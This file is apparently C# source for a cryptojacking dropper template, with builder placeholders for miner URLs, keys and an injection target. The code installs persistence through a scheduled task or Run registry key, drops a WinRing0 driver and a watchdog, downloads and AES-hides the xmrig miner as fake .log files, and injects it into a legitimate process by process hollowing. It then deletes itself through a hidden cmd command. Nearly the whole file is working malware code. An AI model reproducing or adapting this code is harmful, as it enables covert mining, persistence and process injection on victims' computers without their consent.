using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif
[assembly: Guid("%Guid%")]

public partial class RProgram
{
#if DefSystem32
    public static string rbD = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH"));
#else
    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH"));
#endif
#if DefInstall
    public static string rplp = PayloadPath;
#endif
#if DefKillWD
    public static string cmdl = Environment.GetCommandLineArgs()[1];
#else
    public static string cmdl = Assembly.GetEntryAssembly().Location;
#endif

    public static void Main()
    {
#if DefInstall
        try{
            if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                try{
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                }
                catch(Exception ex){
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
#if DefDebug
                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                }
            }else{
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
            }
        }
        catch(Exception ex){
#if DefDebug
            MessageBox.Show("M2: " +ex.ToString());
#endif
        }
        
       if (cmdl.ToLower() != rplp.ToLower())
        {
            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
            {
                proc.Kill();
            }

            try
            {
                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"));
            } catch(Exception ex) {}

            try
            {
                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log"));
            } catch(Exception ex) {}

            Directory.CreateDirectory(Path.GetDirectoryName(rplp));
            File.Copy(cmdl, rplp, true);
            Thread.Sleep(2 * 1000);
            Process.Start(new ProcessStartInfo
            {
                FileName = rplp,
                WorkingDirectory = Path.GetDirectoryName(rplp),  
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
            RExit();
        }
#endif

        try
        {
            try
            {
                Directory.CreateDirectory(rbD);
#if DefWatchdog
            if (Process.GetProcessesByName(RGetString("#WATCHDOG")).Length < 1)
            {
                File.WriteAllBytes(rbD + RGetString("#WATCHDOG") + ".exe", RGetTheResource("#watchdog"));

                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(rbD, RGetString("#WATCHDOG") + ".exe"),
                    WorkingDirectory = rbD,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
#endif
                File.WriteAllBytes(Path.Combine(rbD, "WR64.sys"), RGetTheResource("#winring"));
            }
            catch (Exception ex)
            {
#if DefDebug
            MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
            }

            string rS = "";

            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;

            var rarg1 = new ConnectionOptions();
            rarg1.Impersonation = ImpersonationLevel.Impersonate;
            var rarg2 = new ManagementScope(@"\root\cimv2", rarg1);
            rarg2.Connect();

            var rarg3 = new ManagementObjectSearcher(rarg2, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget")))).Get();
            foreach (ManagementObject MemObj in rarg3)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(RGetString("#MINERID")))
                {
                    RExit();
                }
            }

#if DefGPU
            try
            {
                string rarg7 = RGetGPU();
                if (rarg7.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || rarg7.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    try
                    {
                        byte[] li = {};
#if DefDownloader
                        if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log")))
                        {
                            using (var client = new System.Net.WebClient())
                            {
                                try {
                                    li = client.DownloadData(client.DownloadString(RGetString("#SANCTAMLIBSURL")));
                                }
                                catch(Exception ex){
#if DefDebug
                                    MessageBox.Show("M5.5: Couldn't get libs from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
#endif
                                }
                                if (li.Length == 0) {
                                    li = client.DownloadData(RGetString("#LIBSURL"));
                                }
                            }
#if DefInstall
                            if (li.Length > 0) {
                                File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log"), RAES_Method(li, true));
                            }
#endif
                        }
                        else
                        {
                            li = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + "-2.log")));
                        }
#else
                        li = RGetTheResource("#libs");
#endif
                        if (li.Length > 0) {
                            using (var archive = new ZipArchive(new MemoryStream(li)))
                            {
                                foreach (ZipArchiveEntry entry in archive.Entries){
                                    entry.ExtractToFile(Path.Combine(rbD, entry.FullName), true);
                                }
                            }

                            if (rarg7.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                rS += " --cuda --cuda-loader=" + "\"" + rbD + "ddb64.dll" + "\"";
                            }

                            if (rarg7.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                rS += " --opencl ";
                            }
                        }
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
                    }
                }
            }
            catch(Exception ex){
#if DefDebug
                MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
            }
#endif

            string argstr = RGetString("#ARGSTR") + rS;
            argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" + Guid.NewGuid().ToString().Replace("-", ""), 10));
            argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" + System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));

            byte[] rxM = { };

#if DefDownloader
            if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")))
            {
                using (var client = new System.Net.WebClient())
                {
                    try
                    {
                        rxM = client.DownloadData(client.DownloadString(RGetString("#SANCTAMMINERURL")));
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("M6.5: Couldn't get xmrig from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
#endif
                    }
                    if (rxM.Length == 0) {
                        rxM = client.DownloadData(RGetString("#MINERURL"));
                    }
                }
#if DefInstall
                if (rxM.Length > 0) {
                    File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"), RAES_Method(rxM, true));
                }
#endif
            }
            else
            {
                rxM = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")));
            }
#else
            rxM = RGetTheResource("#xmr");
#endif

            try
            {
                if (rxM.Length > 0)
                {
                    using (var archive = new ZipArchive(new MemoryStream(rxM)))
                    {
                        foreach (ZipArchiveEntry entry in archive.Entries)
                        {
                            if (entry.FullName.Contains("ri"))
                            {
                                using (var streamdata = entry.Open())
                                {
                                    using (var ms = new MemoryStream())
                                    {
                                        streamdata.CopyTo(ms);
                                        RRun(ms.ToArray(), ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), argstr);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DefDebug
            MessageBox.Show("M7: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M8: " + Environment.NewLine + ex.ToString());
#endif
        }
        RExit();
    }

    public static byte[] RGetTheResource(string rarg1)
    {
        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
        return RAES_Method((byte[])MyResource.GetObject(rarg1));
    }

    public static string RGetString(string rarg1)
    {
        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
    }

    public static string RTruncate(string rarg1, int rarg2)
    {
        if (string.IsNullOrEmpty(rarg1))
        {
            return rarg1;
        }
        return rarg1.Length > rarg2 ? rarg1.Substring(0, rarg2) : rarg1;
    }

    public static void RExit()
    {
#if DefKillWD
        Process.Start(new ProcessStartInfo()
        {
            FileName = "cmd",
            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        });
#endif
        Environment.Exit(0);
    }

#if DefGPU
    public static string RGetGPU()
    {
        try
        {
            string rarg7 = "";

            var rarg4 = new ConnectionOptions();
            rarg4.Impersonation = ImpersonationLevel.Impersonate;
            var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
            rarg5.Connect();

            var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                rarg7 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
            }

            return rarg7;
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("9: " + Environment.NewLine + ex.ToString());
#endif
        }
        return "";
    }
#endif

    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
    {
        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : rarg5.CreateDecryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
        using (var rarg7 = new MemoryStream())
        {
            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
            {
                rarg8.Write(rarg1, 0, rarg1.Length);
                rarg8.Close();
            }

            return rarg7.ToArray();
        }
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string rarg1,
                                                 string rarg2,
                                                 IntPtr rarg3,
                                                 IntPtr rarg4,
                                                 bool rarg5,
                                                 uint rarg6,
                                                 IntPtr rarg7,
                                                 string rarg8,
                                                 byte[] rarg9,
                                                 byte[] rarg10);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long rarg1,
                                              long rarg2,
                                              long rarg3,
                                              uint rarg4,
                                              uint rarg5);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long rarg1,
                                                  long rarg2,
                                                  byte[] rarg3,
                                                  int rarg4,
                                                  long rarg5);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long rarg1,
                                                    long rarg2);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long rarg1,
                                                IntPtr rarg2);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long rarg1,
                                                IntPtr rarg2);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long rarg1);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long rarg1);

    public static void RRun(byte[] rarg1, string rarg2, string rarg3)
    {
        int rarg4 = Marshal.ReadInt32(rarg1, 0x3c);

        long rarg5 = Marshal.ReadInt64(rarg1, rarg4 + 0x18 + 0x18);

        byte[] rarg6 = new byte[0x18];

        IntPtr rarg7 = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

        Marshal.WriteInt32(rarg7, 0x30, 0x0010001b);

        CreateProcess(null, rarg2 + (!string.IsNullOrEmpty(rarg3) ? " " + rarg3 : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(rarg2), new byte[0x68], rarg6);
        long rarg8 = Marshal.ReadInt64(rarg6, 0x0);
        long rarg9 = Marshal.ReadInt64(rarg6, 0x8);

        ZwUnmapViewOfSection(rarg8, rarg5);
        VirtualAllocEx(rarg8, rarg5, Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x038), 0x3000, 0x40);
        WriteProcessMemory(rarg8, rarg5, rarg1, Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x03c), 0L);

        for (short i = 0; i < Marshal.ReadInt16(rarg1, rarg4 + 0x4 + 0x2); i++)
        {
            byte[] rarg10 = new byte[0x28];
            Buffer.BlockCopy(rarg1, rarg4 + (0x18 + Marshal.ReadInt16(rarg1, rarg4 + 0x4 + 0x10)) + (0x28 * i), rarg10, 0, 0x28);

            byte[] rarg11 = new byte[Marshal.ReadInt32(rarg10, 0x010)];
            Buffer.BlockCopy(rarg1, Marshal.ReadInt32(rarg10, 0x014), rarg11, 0, rarg11.Length);

            WriteProcessMemory(rarg8, rarg5 + Marshal.ReadInt32(rarg10, 0x00c), rarg11, rarg11.Length, 0L);
        }

        GetThreadContext(rarg9, rarg7);

        WriteProcessMemory(rarg8, Marshal.ReadInt64(rarg7, 0x88) + 16, BitConverter.GetBytes(rarg5), 8, 0L);

        Marshal.WriteInt64(rarg7, 0x80, rarg5 + Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x10));

        SetThreadContext(rarg9, rarg7);
        ResumeThread(rarg9);

        Marshal.FreeHGlobal(rarg7);
        CloseHandle(rarg8);
        CloseHandle(rarg9);
    }
}